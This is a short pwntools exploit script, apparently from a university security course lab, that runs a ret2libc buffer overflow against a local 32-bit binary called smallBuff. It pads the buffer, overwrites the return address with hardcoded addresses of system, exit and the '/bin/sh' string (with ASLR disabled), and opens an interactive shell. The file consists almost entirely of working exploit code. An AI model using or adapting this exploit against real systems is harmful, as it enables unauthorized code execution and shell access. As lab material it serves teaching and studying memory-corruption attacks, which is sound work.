#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], gdbscript=gdbscript, aslr=False)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath])


binPath="/home/kali/ENPM691/Lecture9/smallBuff"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *main+15
break *main+24
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="debug"
io = start()

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

# define payload here because it's passed as an argument to the binary:

# start program and check GOT after
# it has resolved gets symbol (only works with ASLR)
# OFF!
overFlow = 8*b'A'
systemLocation = pwn.p32(0xf7dfdd00)
binsh = pwn.p32(0xf7f48b62)
exitAddr = pwn.p32(0xf7df0680)

payload = pwn.flat(
        [
            overFlow,
            systemLocation,
            exitAddr,
            binsh
            ]
        )

io.sendline(payload)

io.interactive()
